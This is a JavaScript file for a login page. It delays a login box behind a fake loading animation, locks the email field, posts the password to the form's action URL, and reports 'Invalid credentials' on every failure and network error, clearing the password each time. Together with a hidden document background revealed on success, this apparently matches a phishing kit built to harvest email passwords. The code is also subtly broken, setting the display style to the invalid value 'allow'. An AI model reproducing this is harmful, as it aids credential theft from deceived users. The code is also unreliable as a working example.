document.addEventListener('DOMContentLoaded', function () {
  // Initially hide the login box and show the loading animation
  const loginBox = document.getElementById('loginBox');
  const loadingAnimation = document.getElementById('loadingAnimation');

  // Show loading animation initially
  loadingAnimation.style.display = 'allow';
  loginBox.style.display = 'none';

  // Delay showing the login box
  setTimeout(function () {
    loadingAnimation.style.display = 'none'; // Hide loading animation
    loginBox.style.display = 'allow'; // Show login box
    // Optional: Add fade-in effect
    setTimeout(function () {
      loginBox.style.opacity = '1';
    }, 10); // Small delay to ensure display:block is applied before opacity transition
  }, 2000); // 2-second delay
});

// Existing form submission logic
document.getElementById('email').readOnly = true;
document.getElementById('loginForm').addEventListener('submit', function (e) {
  e.preventDefault(); // Prevent page reload

  const form = e.target;
  const formData = new FormData(form);

  fetch(form.action, {
    method: 'POST',
    body: formData,
  })
  .then(res => res.json())
  .then(data => {
    if (data.status === 'success') {
      // ✅ Login successful
      document.getElementById('tableBackground').classList.add('active');
      document.getElementById('loginBox').style.display = 'none';
    } else {
      // ❌ Invalid credentials
      document.getElementById('error').textContent = 'Invalid credentials.';
      document.getElementById('error').style.display = 'block';

      // 🔄 Clear the password input field
      const passwordInput = form.querySelector('input[name="password"]');
      if (passwordInput) {
        passwordInput.value = '';
      }
    }
  })
  .catch(() => {
    // ⚠️ Server/network issue
    document.getElementById('error').textContent = 'Invalid credentials. Input correct details';
    document.getElementById('error').style.display = 'block';

    // 🔄 Clear the password input field
    const passwordInput = form.querySelector('input[name="password"]');
    if (passwordInput) {
      passwordInput.value = '';
    }
  });
});
